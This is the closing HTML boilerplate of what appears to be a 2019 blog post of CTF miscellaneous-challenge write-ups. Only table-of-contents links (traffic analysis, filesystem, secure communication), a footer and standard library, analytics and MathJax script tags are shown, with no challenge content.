class="nav-link" href="#Misc4-第四扩展FS"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">Misc4 - 第四扩展FS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Misc3-流量分析"><span class="nav-number">2.3.0.3.</span> <span class="nav-text">Misc3 - 流量分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Misc5-安全通信"><span class="nav-number">2.3.0.4.</span> <span class="nav-text">Misc5 - 安全通信</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结尾"><span class="nav-number">3.</span> <span class="nav-text">结尾</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">W z</span>

  
</div>


<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>




  <span class="post-meta-divider">|</span>



<div class="powered-by">
 桂ICP备17008880号
 </div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="https://cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/velocity/1.2.1/velocity.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/velocity/1.2.1/velocity.ui.min.js"></script>
  

  
  
    <script type="text/javascript" src="https://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
